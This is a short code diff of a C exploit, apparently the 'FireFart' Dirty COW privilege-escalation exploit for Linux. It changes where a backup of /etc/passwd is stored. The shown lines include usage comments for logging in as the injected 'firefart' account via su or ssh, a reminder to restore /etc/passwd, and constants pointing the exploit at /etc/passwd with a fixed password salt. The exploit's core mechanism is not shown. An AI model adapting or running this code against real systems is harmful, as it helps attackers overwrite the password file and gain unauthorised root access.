@@ -22,7 +22,7 @@
 // Afterwards, you can either "su firefart" or "ssh firefart@..."
 //
 // DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
-//   mv /tmp/passwd.bak /etc/passwd
+//   mv passwd.bak /etc/passwd
 //
 // Exploit adopted by Christian "FireFart" Mehlmauer
 // https://firefart.at
@@ -43,7 +43,7 @@
 #include <crypt.h>
 
 const char *filename = "/etc/passwd";
-const char *backup_filename = "/tmp/passwd.bak";
+const char *backup_filename = "passwd.bak";
 const char *salt = "firefart";
 
 int f;
